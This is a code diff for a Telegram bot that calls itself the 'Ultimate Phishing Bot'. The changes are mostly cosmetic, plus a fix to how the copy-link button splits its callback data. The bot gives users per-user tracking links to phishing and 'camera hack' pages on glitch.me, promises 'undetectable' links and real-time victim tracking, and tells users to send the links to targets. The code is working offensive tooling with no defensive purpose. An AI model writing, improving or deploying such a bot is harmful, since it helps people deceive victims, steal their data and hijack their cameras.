@@ -16,16 +16,19 @@ app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT
 async def start_command(client, message):
     keyboard = InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
-            InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")
+            InlineKeyboardButton("✨ ALL-IN-ONE ✨", callback_data="all_in_one"),
+            InlineKeyboardButton("📸 CAM HACK 📸", callback_data="camera_hack")
         ]
     ])
-
+    
     welcome_text = (
-        "<b><font face='Arial Black'>🔰 Welcome to the Ultimate Phishing Bot! 🔰</font></b>\n\n"
-        "<font face='Comic Sans MS'>🔥 Generate undetectable phishing links in seconds & send them to your targets!</font>\n"
-        "<font face='Comic Sans MS'>🎯 Track victims in real-time & collect data effortlessly.</font>\n\n"
-        "<b><font face='Arial Black'>🛑 Warning: High Security System Activated 🛑</font></b>\n\n"
+        "<b><i>🔰 Welcome to the Ultimate Phishing Bot! 🔰</i></b>\n\n"
+        
+        "<b>🔥 Generate undetectable phishing links in seconds & send them to your targets!</b>\n"
+        
+        "<b>🎯 Track victims in real-time & collect data effortlessly.</b>\n\n"
+        
+        "<b>🛑 Warning: High Security System Activated 🛑</b>\n\n"
         "<i>⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️</i>"
     )
 
@@ -39,8 +42,8 @@ async def callback_handler(client, callback_query):
 
     # 🌐 Generate Phishing Links
     links = {
-        "all_in_one": ("ALL-IN-ONE ATTACK", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
-        "camera_hack": ("CAMERA HACK", f"https://four-political-blouse.glitch.me/?id={user_id}")
+        "all_in_one": ("✨ ALL-IN-ONE ATTACK ✨", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
+        "camera_hack": ("📸 CAMERA HACK 📸", f"https://four-political-blouse.glitch.me/?id={user_id}")
     }
 
     if data in links:
@@ -57,18 +60,18 @@ async def callback_handler(client, callback_query):
             await asyncio.sleep(0.1)
             await loading_message.edit_text(stage)
 
-        await asyncio.sleep(0.1)
+        await asyncio.sleep(0.1)  # Short pause before deleting the loading message
         await loading_message.delete()
 
         # 📝 Send the Generated Link with Copy Button
         message_text = (
-            f"<b><font face='Arial Black'>🛠 Page Name:</font></b> <code>{page_name}</code>\n"
-            f"<b><font face='Arial Black'>🔗 Link:</font></b> <a href='{link}'>Click Here</a>\n\n"
-            "<font face='Comic Sans MS'>🎯 Just send this to your target!</font>"
+            f"✨ <b>Page Name:</b> <i>{page_name}</i>\n"
+            f"🔗 <b>Link:</b> <code>{link}</code>\n\n"
+            f"🎯 <b>Just send this to your target!</b>"
         )
 
         copy_button = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
+            [InlineKeyboardButton("📋 🔥 Copy Link 🔥 📋", callback_data=f"copy|{user_id}|{data}")]
         ])
 
         await callback_query.message.reply_text(
@@ -77,13 +80,13 @@ async def callback_handler(client, callback_query):
     else:
         await callback_query.answer("❌ Invalid selection!", show_alert=True)
 
-# 📋 Copy Link Handler
-@app.on_callback_query(filters.regex("^copy_"))
+# 📋 Copy Link Handler (🔥 Fixed Issue!)
+@app.on_callback_query(filters.regex("^copy\\|"))
 async def copy_link_handler(client, callback_query):
     try:
-        _, user_id, data = callback_query.data.split("_", 2)
-        user_id = int(user_id)
-
+        _, user_id, data = callback_query.data.split("|")  # Extract user_id and data
+        user_id = int(user_id)  # Convert user_id back to integer
+        
         links = {
             "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
             "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
